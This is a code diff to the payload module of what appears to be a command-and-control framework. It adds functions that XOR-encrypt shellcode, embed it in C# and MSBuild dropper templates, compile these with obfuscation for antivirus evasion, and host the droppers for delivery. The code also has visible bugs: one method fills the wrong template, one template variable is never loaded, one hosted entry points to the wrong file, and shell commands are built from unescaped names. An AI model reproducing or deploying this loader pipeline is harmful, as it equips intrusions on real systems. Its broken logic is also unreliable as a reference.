@@ -1,7 +1,6 @@
 from io import StringIO
 import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
 from enum import Enum
-
 from subprocess import Popen
 import time
 from datetime import datetime
@@ -68,6 +67,11 @@ class Payloads(object):
         self.AllBeaconImages=get_images()
         self.KillDate=get_killdate()
         self.Sleep=get_defaultbeacon()
+        self.InstallUtil = ""
+        self.DInvokeEXE = ""
+        self.PInvokeEXE = ""
+        self.PInvokeInstallUtil = ""
+        self.PMsbuild = ""
 
         if os.path.exists("%saes.py" % PayloadsDirectory):
             with open("%saes.py" % PayloadsDirectory, 'r') as f:
@@ -115,6 +119,15 @@ class Payloads(object):
         self.amsiBypass = str(content)
         with open("%sInstallUtil.cs"%PayloadTemplatesDirectory,'r') as f:
             self.installUtil = f.read()
+        with open("%sDInvokeEXE.cs"%PayloadTemplatesDirectory,'r') as f:
+            self.DInvokeEXE = f.read()
+        with open("%sPInvokeEXE.cs"%PayloadTemplatesDirectory,'r') as f:
+            self.PInvokeEXE = f.read()
+        with open("%sPInvokeInstallUtil.cs" % PayloadTemplatesDirectory, 'r') as f:
+            self.PInvokeInstallUtil = f.read()
+        with open("%spmsbuild.xml" % PayloadTemplatesDirectory, 'r') as f:
+            self.PMsbuild = f.read()
+
     def QuickstartLog(self, txt):
         if not self.quickstart:
             self.quickstart = ''
@@ -624,11 +637,174 @@ class Payloads(object):
             if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                 self.CreateMsbuildFiles(Payload, name)
 
-    def CreateInstallUtil(self, shellcodePath,name=""):
+    def CreateInstallUtil(self, shellcodePath,arch,name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("installUtil payload files:")
 
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
 
+        key = key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode()
+        b64key = base64.b64encode(bytes(key)).decode()
+
+        source = self.InstallUtil.replace("##BASE64SHELLCODE##", b64shellcode).\
+            replace("##BASE64KEY##",b64key)
+        with open("%s%s_InstallUtilDropper_%s.cs" % (self.BaseDirectory, name,arch), 'w') as f:
+            f.write(source)
+
+        '''/root/.dotnet/dotnet /opt/offsec/AVEvasion/SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p x64 -o console -f ~/installobf -s ~/installUtilSource.cs --confuse '''
+        subprocess.check_output(
+            f"~/.dotnet/dotnet {PayloadTemplatesDirectory}/../SharpGen/bin/Debug/netcoreapp2.1/Sharpgen.dll -p {arch} -o console -f {self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe -s {self.BaseDirectory}{name}_InstallUtilDropper_{arch}.cs --confuse {PayloadTemplatesDirectory}../SharpGen/confuseInstallUtil.cr", shell=True)
+
+        insert_hosted_file("%s%s_installUtil_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe",
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%s_installUtil" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe",
+                           "application/octet-stream", "No", "Yes")
+
+    def CreateDInvokeEXE(self, shellcodePath,arch,name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("DInvokeEXE payload files:")
+
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
+
+        key = key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode()
+        b64key = base64.b64encode(bytes(key)).decode()
+
+        source = self.DInvokeEXE.replace("##BASE64SHELLCODE##",b64shellcode).\
+            replace("##BASE64KEY##",b64key)
+        with open("%s%sDInvokeEXEdropper_%s.cs" % (self.BaseDirectory, name,arch), 'w') as f:
+            f.write(source)
+
+        '''/root/.dotnet/dotnet /opt/offsec/AVEvasion/SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p x64 -o console -f ~/installobf -s ~/sourceDInvoke.cs --confuse '''
+        subprocess.check_output(
+            f"~/.dotnet/dotnet {PayloadTemplatesDirectory}../SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p {arch} -o console -f {self.BaseDirectory}{name}DInvokeEXEdropper_{arch}.exe -s {self.BaseDirectory}{name}DInvokeEXEdropper_{arch}.cs --confuse {PayloadTemplatesDirectory}../SharpGen/confuseEXE.cr", shell=True)
+
+        insert_hosted_file("%s%s_dinvoke_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}DInvokeEXEdropper_{arch}.exe",
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%s_dinvoke" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}DInvokeEXEdropper_{arch}.exe",
+                           "application/octet-stream", "No", "Yes")
+
+    def CreatePInvokeInstallUtil(self,shellcodePath,arch,name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("PInstallUtil payload files:")
+
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
+
+        key = key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode('UTF-8')
+        b64key = base64.b64encode(bytes(key)).decode('UTF-8')
+
+        source = self.PInvokeInstallUtil.replace("##BASE64SHELLCODE##", b64shellcode).\
+            replace("##BASE64KEY##",b64key)
+        with open("%s%sPInvokeInstallUtilDropper_%s.cs" % (self.BaseDirectory, name,arch), 'w') as f:
+            f.write(source)
+
+        '''/root/.dotnet/dotnet /opt/offsec/AVEvasion/SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p x64 -o console -f ~/installobf -s ~/installUtilSource.cs --confuse '''
+        subprocess.check_output(
+            f"~/.dotnet/dotnet {PayloadTemplatesDirectory}../SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p {arch} -o console -f {self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.exe -s {self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.cs --confuse {PayloadTemplatesDirectory}../SharpGen/confuseInstallUtil.cr", shell=True)
+
+        insert_hosted_file("%s%s_pinstallUtil_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe",
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%s_pinstallUtil" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.exe",
+                           "application/octet-stream", "No", "Yes")
+        self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pinstallUtil")
+        self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pinstallUtil_b64")
+
+    def CreatePInvokeEXE(self, shellcodePath,arch,name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("PInvokeEXE payload files:")
+
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
+
+        key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode('UTF-8')
+        b64key = base64.b64encode(bytes(key)).decode('UTF-8')
+
+        source = self.PInvokeEXE.replace("##BASE64SHELLCODE##",b64shellcode).\
+            replace("##BASE64KEY##",b64key)
+        with open("%s%sPInvokeEXEdropper_%s.cs" % (self.BaseDirectory, name,arch), 'w') as f:
+            f.write(source)
+
+        '''/root/.dotnet/dotnet /opt/offsec/AVEvasion/SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p x64 -o console -f ~/installobf -s ~/sourcePInvoke.cs --confuse '''
+        subprocess.check_output(
+            f"~/.dotnet/dotnet {PayloadTemplatesDirectory}../SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p {arch} -o console -f {self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.exe -s {self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.cs --confuse {PayloadTemplatesDirectory}../SharpGen/pinvokeconfuse.cr", shell=True)
+
+        insert_hosted_file("%s%spinvoke_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.exe",
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%spinvoke" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.exe",
+                           "application/octet-stream", "No", "Yes")
+        self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke")
+        self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke_b64")
+
+    def CreatePMsbuild(self,shellcodePath,arch,name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("PInvokeEXE payload files:")
+
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
+
+        key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode('UTF-8')
+        b64key = base64.b64encode(bytes(key)).decode('UTF-8')
+        source = self.PInvokeEXE.replace("##BASE64SHELLCODE##", b64shellcode). \
+            replace("##BASE64KEY##", b64key).\
+            replace("#REPLACEMERANDSTRING#",str(randomuri()))
+
+        with open("%s%sPMsbuildDropper_%s.xml" % (self.BaseDirectory, name,arch), 'w') as f:
+            f.write(source)
+
+        insert_hosted_file("%s%spmsbuild_b64" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}PMsbuildDropper_{arch}.xml",
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%spmsbuild" % (self.QuickCommand, name),
+                           f"{self.BaseDirectory}{name}PMsbuildDropper_{arch}.xml",
+                           "application/octet-stream", "No", "Yes")
+        self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pmsbuild")
+        self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pmsbuild_b64")
 
     def CreateCsc(self, name="", pbindOnly=False):
         self.QuickstartLog(Colours.END)
